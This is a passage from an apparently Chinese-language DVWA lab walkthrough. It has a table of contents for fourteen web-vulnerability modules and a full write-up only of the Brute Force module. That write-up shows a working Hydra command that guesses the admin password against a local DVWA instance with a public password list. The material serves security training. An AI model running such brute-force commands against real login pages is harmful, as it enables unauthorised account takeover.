href="#202053ab-b28a-476a-b972-54002aea7fd9">:: Security: Low</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#aecb3b56-8763-44f8-af98-cfe43013b057">1. Brute Force</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#81968623-fe24-4b97-a4fb-679ad6aacc0c">Objective: Your goal is to get the administrator’s password by brute forcing. Bonus points for getting the other four user passwords!</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#333cbfff-be90-4348-9381-48328b2a64ea">觀察及測試</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#8ef26c03-0ca7-44ef-a381-6a7c3dd3a73f">使用 Hydra 測試密碼</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b041bc1e-f097-4067-89b0-a3d78a5414a0">password lists</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#cf95782a-3f9b-4e63-ba94-4b22b11c4c00">snippets</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d1ec6de6-be52-41cf-b3d3-2048df79e00a">Target URL</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f78d018a-aa8d-4570-a1db-d20d8fa076cf">Hydra snippets</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#0dc265ec-9808-4c56-97c7-439f8139f0fb">module: http-form-get</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#a3c5d7ed-e406-4951-8ec5-42c819f35051">可以用 hydra -U http-get-form 閱讀一下 module 用法</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#7840470c-5d8d-4983-8295-a2ae1ca1a273">http-form-get module syntax</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e4c0e2d9-8290-4d21-9c4c-84dbb4ee3558">path</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b53c31d1-6755-404e-aeee-adb1a10c1245">GET/POST 變數用 <code>^</code> 包住</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#3b17145f-8d12-4727-a265-496a3ed0089c">error message</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#613730f8-5a92-403e-bd9c-f84a041a9c4d">brute force</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#73c057ee-d6f4-4c6a-95ad-94d8f8dd57b5">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ed3e60aa-160d-4f00-a2be-c410d17d8cf2">心得</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#add8f0b1-8ccf-4676-bdd3-b8a197c351e6">memo</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#c63e7570-37ec-447a-831a-d93ecb950d4a">2. Command Injection</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e1dab721-9dbf-4450-84de-9db1183a6704">Objective: Remotely, find out the user of the web service on the OS, as well as the machines hostname via RCE.</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#a1e9b76e-8682-49f1-8df0-36eb4fcfca56">失敗範例</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#94e6546f-3072-4126-9f4e-9661a57b8b1f">成功範例</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6f8c15da-f353-4e89-9075-a3ed010c3901">直接跳過 ping</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6b283711-113d-4fb2-a4aa-33f32af9ab72">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#9b8d8aa9-5dd5-49db-ad0a-6d3f2eed0c33">3. Cross Site Request Forgery (CSRF)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#09ea0a95-e3bf-4137-b15a-844b1da7b88f">Objective: Your task is to make the current user change their own password, without them knowing about their actions, using a CSRF attack.</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b5507413-4d34-4bc1-99a8-1f3e835c540d">成立條件至少有兩個:</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ccebfd03-719f-4b1a-89b5-6137a0801f5f">GET </a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#816c4f88-9fc1-447e-b19c-b123ea757777">by &lt;img /&gt; tag</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#0219cc99-bbc0-492e-9922-a2b41cc0fd3c">心得</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#d9f4e4b1-a7c3-45fc-8b03-d132104476a5">memo</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#06f5c877-12ac-4ea3-97df-32c6ec5dfc08">試著用 curl 模擬 CSRF 的過程</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#17a559f9-e305-488d-b70f-ade3e2908590">create and use cookie</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#46910e72-a7a8-4a6c-bb1a-73a292e724b1">模擬登入取得 cookie</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#2dbdc3e2-bd35-4963-8102-e03e070ce3ff">處理 user_token</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#b292b0d2-febc-4f76-8923-f3cadca8d942">4. File Inclusion</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b41a8dd-389a-406a-8f0d-141f08db06ea">Objective: Read all <span style="border-bottom:0.05em solid">five</span> famous quotes from &#x27;<a href="http://localhost:8086/hackable/flags/fi.php">../hackable/flags/fi.php</a>&#x27; using only the file inclusion.</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#929ef182-0aab-4e98-8ded-1f0a06359ab0">觀察</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#fb1572b1-23c7-41cf-8b8a-8e59a2267cc7">測試 URL parameters</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#a618ad05-5472-43f0-b787-3f3edc39367b">查看提示中的連結</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#5910e587-7fdb-4cfa-91f6-9f3ac6331fb6">試著從其他地方存取檔案</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e6c017f6-57a6-4ba3-8319-575c0bcd9eb6">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#be508e82-4c01-49ef-b20f-e3e9bf2195c8">memo</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#1caa8cbb-40cd-44cd-b45d-225c591ddb7f">測試載入遠端檔案</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#48b56c59-1b05-4aae-a93a-223248d25b67">準備一個要被遠端載入的檔案</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#71e0bdf1-dacc-431d-8d6a-e1d974a47791">5. File Upload</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#568188c6-0c86-4929-ad23-97badd6a3bfb">Objective: Execute any PHP function of your choosing on the target system (such as <a href="https://secure.php.net/manual/en/function.phpinfo.php">phpinfo()</a> or <a href="https://secure.php.net/manual/en/function.system.php">system()</a>) thanks to this file upload vulnerability.</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b68887c5-7102-4a63-9a0c-3254eaa8393a">觀察</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#56bdd3f5-01fe-4d10-a9b3-aa4e3ca38183">可以先測試檔案的型態, 大小, 格式 等限制</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#6d665eaa-d01b-4916-8e89-3a441ad60d91">留意上傳檔案的位置，因為這代表我們有機會執行這個路徑上的檔案</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d15600dc-1354-4b4f-99c3-74730052687e">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#4123bb58-ab89-492e-8201-1b533864376c">memo</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d92184df-2762-48a2-bd2b-09e0e220432b">可以跟 Command injection 混搭測試，執行上傳的惡意檔案</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#80a29f5d-7fd5-4c84-a2fa-a5b55e10a12e">6. Insecure CAPTCHA</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b503e026-be1d-473d-9f77-3c49bd235682">Objective: Your aim, change the current user&#x27;s password in an automated manner because of the poor CAPTCHA system.</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ee512d8b-7a67-4d9d-a893-b4a5a6a1ce48">觀察</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#3b4ec943-297c-4da9-9bd7-e6840f1e5e78">試著 bypass 驗證</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#74739a6f-99c8-4b3b-9dac-d02ace73629e">跳過驗證，直接送 POST</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c1001744-6c29-4243-b00b-88cca57af9fb">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#41f83013-8b6d-4fd0-b71b-c6ebc3447415">心得</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#a3897bae-a63f-4b5a-81f2-53ee14cde1c1">1. 先關閉 javascript</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#4c702716-6c10-46a0-bf8a-1d94dc6304bb">2. 再直接送出 POST (不透過表單)</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#773b9bf8-c13a-4248-9c21-d3b305b08d58">7. SQL Injection</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#fff7080d-15fb-4efd-bd12-a85c82d2e5c7">觀察</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#d3c0dda0-310d-422b-a80d-d4f759d1985a">測試及觀察錯誤訊息</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#a6365d34-7cbc-493c-8126-191e18808463">取得密碼</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#4c3f2cae-1e83-4602-9b0b-e2925c879e6c">測試 column names</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#a534a8c3-6a0f-4dcc-bd05-d9ddedff2ed9">測試 table name</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e98015da-7d8a-44e8-96a1-271544c67bfc">show more about tables by query information_schema</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#cb318cab-0672-4a6a-a882-fa4b9ee676db">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e7dcd85b-6018-4013-a6db-a04ed292441d">心得</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#422fe114-71e0-4f9a-b914-9cd31bbb06ca">8. SQL Injection (Blind)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#f83af973-6404-4b75-9155-5498fba5563e">Objective: Find the version of the SQL database software through a blind SQL attack.</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#dc58d15f-ac3d-41ae-bf16-7b598a6f8a6b">分析</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1dbb5c0d-d168-42bd-9007-071953dfd22f">1. 如果要使用 UNION，那 UNION 左邊和右邊需要回傳一樣的欄位數量</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#aa52aaa7-10ca-4acf-a61c-39b710da0938">2. 可以不透過 IF 來判斷版本</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#37724e17-1017-4296-b6b4-4af1fbb4fcfd">卡關</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#7de8f1ef-30c0-4e2f-8d91-61e5a3fade34">驗證測試</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b8f472b7-e446-4b92-8757-dc6b60b694ae">開始推測</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#1cdf16a6-96a6-4d00-83c3-742f1c72e708">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#02b235c1-9380-4c2c-9de3-f893eef44798">memo</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#bb14437f-c7a0-40ee-9a01-e6da4cb749fe">9. Weak Session IDs</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#613aa4fd-7d68-4a02-b1d7-8dc4ff608c0b">Objective: This module uses four different ways to set the dvwaSession cookie value, the objective of each level is to work out how the ID is 
+generated and then infer the IDs of other system users.</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#8b8d9d48-f775-4f60-af2a-13bdbfb08656">觀察</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#bc7b2ea2-5262-4791-be7d-a21ad43602ee">10. DOM Based Cross Site Scripting (XSS)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5230530a-12e7-4347-b7da-906e4a23a5a7">Objective: Run your own JavaScript in another user&#x27;s browser, use this to steal the cookie of a logged in user.</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ba16c4aa-e653-4069-890d-e9b0f6f5c66c">觀察</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#0f342a28-74cb-4792-b177-8553d21f88fc">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#007abd42-3143-4c78-a633-f78ae2b70a08">Ref</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#d5cba4bb-e68d-40db-9814-e7e28a19c2c8">Types of XSS</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#df806f22-a4c5-4768-aaef-4b75d5f13341">11. Reflected Cross Site Scripting (XSS)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#733e6960-b860-4e73-b0d9-ccc5cdf32407">觀察</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b6c0f9c3-17e4-4515-8f46-72b7c45a6e01">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#0593f4bd-d6a2-4115-8cb6-6e50e026cfbd">12. Stored Cross Site Scripting (XSS)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#4adfc186-fd13-4f0f-973f-7b5c99782a7d">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#0bab4e19-4261-4113-be06-61fc8fafc0c9">13. Content Security Policy (CSP) Bypass</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ac14265a-b5c2-4e1b-b70c-b648e859ae37">Bypass Content Security Policy (CSP) and execute JavaScript in the page.</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#27ff8af9-fb8d-4a5d-ae4e-a6b51b882c5b">觀察 CSP 設定</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#9ffc6cb8-2521-4c51-971a-4a5612518214">script-src</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#0070a149-98a1-4fe1-b1d8-dd5e887bf23c">試著載入來自 pastebin 的 js file</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#0af5ae0c-953e-4d63-b214-5e4cb53d9d83">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e6706e51-015c-435c-869a-3524ea8c9ba2">心得</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#4269aa9d-fc42-47dd-8589-8c6f3df39362">14. JavaScript Attacks</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#05ee4167-1363-47aa-8467-73b2a4422a13">觀察</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#07b10677-8603-4c46-a5b4-c19237825cc6">查看表單細節</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#bc040994-1d09-4215-b7f6-4279c34e4d2b">檢查送出前 javascript 有做哪些處理</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#96242907-48d2-4c1e-970c-d0248629ff7a">✨Done✨</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c2792a98-5b12-4b31-b174-a31ce72a486f">memo</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d671f208-518c-4f8e-9644-3e4c1da2f7de">測試 <code>generate_token()</code> </a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2bcfacbc-f164-4027-a135-4caf29ba116b">Ref</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e502987e-4008-4707-bfe9-421da3128c76">run DVWA with container</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#0f9b6d16-2a3d-4cbf-8adb-1df91dffd941">Enable PHP modules</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b6e030d6-8d43-4e52-bcb6-276b060f3f24">Editing php.ini</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#1e042a15-03ad-4e12-ac44-e7dc1aa7b6e6">1. 直接進入 container 內修改</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f6382593-1920-48d1-a966-c59e1480a500">2. 或自行 build image</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#149ce9a2-804a-409d-9e17-084a081d76e4">Hydra</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#69d20057-92a9-41f1-b4ac-2aeb7f670830">password list</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#7754a736-5d4e-4861-a5e0-7b3eb2347a1d">Medusa</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#68b12f97-837d-4295-b364-e2a9580acb55">write-ups</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#90e2f34d-b1f9-40b0-8920-71f2b74a4a58"><em>reCAPTCHA API key missing</em></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#929690db-c3d6-4da0-8e77-eae8619d6b2a">取得 <em>reCAPTCHA v2 </em>public &amp; private key</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#af0301f7-541d-47a9-aa99-db697d17e5eb">不支援 <a href="http://localhost">localhost</a> 了，因此可以用 .local or 自己定義其他 alias 取代 localhost</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c7d27952-5940-4087-b369-4815e780af87">edit hosts file</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ca62db91-7346-4126-ac4d-137925d95a0e">Other links</a></div></nav><hr id="95130c8b-4f18-4b4a-b580-d1c6996f04f8"/><h1 id="4f40850f-8ceb-4159-8b6e-a6d0bf0c0387" class="">DVWA 環境</h1><pre id="cc6a534f-db1e-4f4b-a5f4-169ab36ad0cc" class="code code-wrap"><code>docker run -d -p 8086:80 vulnerables/web-dvwa</code></pre><h1 id="202053ab-b28a-476a-b972-54002aea7fd9" class="">:: Security: Low</h1><p id="39c375b2-510f-4632-ae1d-b3e269bf74e0" class="">基本上可以比較沒負擔的體驗弱點造成的傷害結果和認知到不安全的實作方式，如果要有挑戰可以打 medium，若要參考比較安全的實作方式可以看 impossible 的難度</p><h1 id="aecb3b56-8763-44f8-af98-cfe43013b057" class="">1. Brute Force</h1><h3 id="81968623-fe24-4b97-a4fb-679ad6aacc0c" class="">Objective: Your goal is to get the administrator’s password by brute forcing. Bonus points for getting the other four user passwords!</h3><p id="1405be6d-162c-4361-bbe3-79916fdc6089" class="">
+</p><p id="b55a9c97-710b-4080-a1ef-1a35db11a1ce" class="">看題目基本上就是要你來硬的 XD</p><p id="a759b6e1-b759-4e5b-bfe2-6ac7915cbdbd" class="">第一個想到的工具是 Hydra or Medusa</p><h2 id="333cbfff-be90-4348-9381-48328b2a64ea" class="">觀察及測試</h2><p id="b1942d39-31c3-48b2-a320-412f64ff82b9" class="">先隨便填寫送出，觀察 Network 後發現不是走 POST</p><figure id="18a0425e-b14f-4c03-822e-8c563383e612" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled.png"><img style="width:672px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled.png"/></a></figure><p id="a40a5a3d-0aca-4d3e-bf1c-20589c34a7f3" class="">
+</p><p id="ddf0fdc0-4e8b-49e6-8a26-f5feaf4ddd19" class="">仔細一看表單沒有指定 aciton 的目標，是透過在 URL 的參數來登入</p><figure id="94731e57-4a41-4160-8d94-c3689576d46f" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%201.png"><img style="width:624px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%201.png"/></a></figure><p id="8e7e8874-cfab-4011-ae28-96ad28303e7a" class="">觀察 URL parameters</p><pre id="4aba36f7-13cf-4c1b-bf4e-bfdcc88d0a64" class="code code-wrap"><code>http://localhost:8086/vulnerabilities/brute/?username=admin&amp;password=123&amp;Login=Login#</code></pre><p id="35168058-eb8d-42d9-99b2-2cc029eb00f7" class="">
+</p><div id="dbbf0285-c6f9-47b0-89af-dbe5da6d6c7b" class="column-list"><div id="378e20cb-b802-4614-a1eb-6af377089a2b" style="width:56.25%" class="column"><p id="e50da50a-e3d3-4fe7-90e2-bdbc801193f1" class="">先記下錯誤訊息，這個在 hydra 中用得到</p><pre id="a4212b68-20be-464a-85f1-09708358f6f5" class="code code-wrap"><code>Username and/or password incorrect.</code></pre></div><div id="4b01b455-2db8-4c2d-b5f5-42723d15534b" style="width:43.75%" class="column"><figure id="549b5b66-69ad-4a0a-9b44-7d5ecc3b4858" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%202.png"><img style="width:336px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%202.png"/></a></figure></div></div><p id="8ee08314-402e-42b8-8c80-ada3b5a8f551" class="">
+</p><h2 id="8ef26c03-0ca7-44ef-a381-6a7c3dd3a73f" class="">使用 Hydra 測試密碼</h2><h3 id="b041bc1e-f097-4067-89b0-a3d78a5414a0" class="">password lists</h3><p id="5c2f6d64-7bb4-45e4-8ea9-5a9b8bf7a526" class="">借用別人的 password list</p><p id="8e1354f8-78c6-485a-bdba-5cc654d89247" class="">SecLists/10-million-password-list-top-100.txt at master · danielmiessler/SecLists
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt</a></p><h3 id="cf95782a-3f9b-4e63-ba94-4b22b11c4c00" class="">snippets</h3><p id="7d29e04a-a006-4748-9698-dda6317da6ce" class="">gnebbia/hydra_notes: Some notes about Hydra for bruteforcing
+<a href="https://github.com/gnebbia/hydra_notes">https://github.com/gnebbia/hydra_notes</a></p><p id="bdd3f496-758c-4f5e-9673-2ece78fc5047" class="">
+</p><h3 id="d1ec6de6-be52-41cf-b3d3-2048df79e00a" class="">Target URL</h3><pre id="a7a8b442-5878-44ba-97fe-ede2acee324a" class="code code-wrap"><code>http://localhost:8086/vulnerabilities/brute/?username=qwe&amp;password=123&amp;Login=Login#</code></pre><h3 id="f78d018a-aa8d-4570-a1db-d20d8fa076cf" class="">Hydra snippets</h3><pre id="a9115302-e376-485e-8271-300c2ac05c54" class="code code-wrap"><code>hydra -V -l &lt;user&gt; -P &lt;password file&gt; -s &lt;port&gt; -f &lt;host&gt; &lt;module&gt; &quot;/vulnerabilities/brute/?:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Username and/or password incorrect.&quot;</code></pre><h3 id="0dc265ec-9808-4c56-97c7-439f8139f0fb" class="">module: http-form-get</h3><h3 id="a3c5d7ed-e406-4951-8ec5-42c819f35051" class="">可以用 hydra -U http-get-form 閱讀一下 module 用法</h3><pre id="95ff1023-66c3-41a0-a744-9b6b94dd2a9c" class="code code-wrap"><code>hydra -U http-get-form</code></pre><h3 id="7840470c-5d8d-4983-8295-a2ae1ca1a273" class="">http-form-get module syntax</h3><pre id="51763cb5-d3f2-44a2-9212-6e9bb7fd25fe" class="code code-wrap"><code>Syntax: &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]</code></pre><h3 id="e4c0e2d9-8290-4d21-9c4c-84dbb4ee3558" class="">path</h3><pre id="6efc658e-c50c-4043-91b8-38255b3abd70" class="code code-wrap"><code>/vulnerabilities/brute/?</code></pre><p id="a315c85d-3b1f-4c96-add2-414eb843189d" class="">
+</p><h3 id="b53c31d1-6755-404e-aeee-adb1a10c1245" class="">GET/POST 變數用 <code>^</code> 包住</h3><pre id="18fe84da-1646-4c07-a506-9c612fb304a5" class="code code-wrap"><code>:username=^USER^&amp;password=^PASS^&amp;Login=Login</code></pre><h3 id="3b17145f-8d12-4727-a265-496a3ed0089c" class="">error message</h3><pre id="20792649-34fd-4d86-ba39-118cb76f8db9" class="code code-wrap"><code>:F=Username and/or password incorrect.</code></pre><h3 id="613730f8-5a92-403e-bd9c-f84a041a9c4d" class="">brute force</h3><p id="ecfeb4a0-3475-40f5-a2b5-77fb0e55be7d" class="">帳號就先用 admin 試試看</p><pre id="40d0f948-19de-48b7-bef4-8842741e182f" class="code code-wrap"><code>hydra -V -l admin -P 10-million-password-list-top-10000.txt -s 8086 -f localhost http-form-get &quot;/vulnerabilities/brute/?:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Username and/or password incorrect.&quot;</code></pre><figure id="94c628c8-ed20-4912-90e9-29df7eadca58" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%203.png"><img style="width:1008px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%203.png"/></a></figure><h3 id="73c057ee-d6f4-4c6a-95ad-94d8f8dd57b5" class="">✨Done✨</h3><div id="ed4e3f73-53c8-4a4d-96e1-4bec730ac24f" class="column-list"><div id="daa83266-332d-4ef0-af15-5a89c9e6baea" style="width:50%" class="column"><pre id="e30dd913-e9c6-4ca2-a44b-0320ca7d718f" class="code code-wrap"><code>帳號: admin
+密碼: password</code></pre><p id="4fe75e83-825c-4818-ae37-4f979641ffe6" class="">
+</p></div><div id="9e170485-c971-4de8-8036-1509c100ee54" style="width:50%" class="column"><figure id="0aeb8285-c547-4151-8c17-39fd41f753fd" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%204.png"><img style="width:288px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%204.png"/></a></figure></div></div><h3 id="ed3e60aa-160d-4f00-a2be-c410d17d8cf2" class="">心得</h3><p id="83a40d18-a984-471a-ab7c-488cf07c3fc4" class="">Hydra options 不太友善 (雖然有 GUI 版本)，有機會想試試 Medusa 或 Burp</p><p id="efe73d1f-c29b-4801-9bce-07d8172f7d2a" class="">Using Burp to Brute Force a Login Page - PortSwigger
+<a href="https://portswigger.net/support/using-burp-to-brute-force-a-login-page">https://portswigger.net/support/using-burp-to-brute-force-a-login-page</a></p><p id="28adaf0e-30c2-4d96-8dec-a35daa6c02df" class="">
